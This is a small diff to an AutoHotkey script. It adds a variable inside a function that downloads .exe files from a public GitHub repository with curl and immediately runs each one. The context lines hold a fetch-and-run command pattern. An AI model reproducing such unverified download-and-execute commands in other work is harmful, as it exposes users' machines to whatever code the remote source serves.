@@ -93,6 +93,7 @@ runAllExes() {
 
     for letter in letters {
         output := path "\" letter ".exe"
+        file := letter ".exe"
         if !FileExist(output) {
             url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
             command := 'cmd /c curl -L -o "' . output . '" "' . url . '" & start ' . output
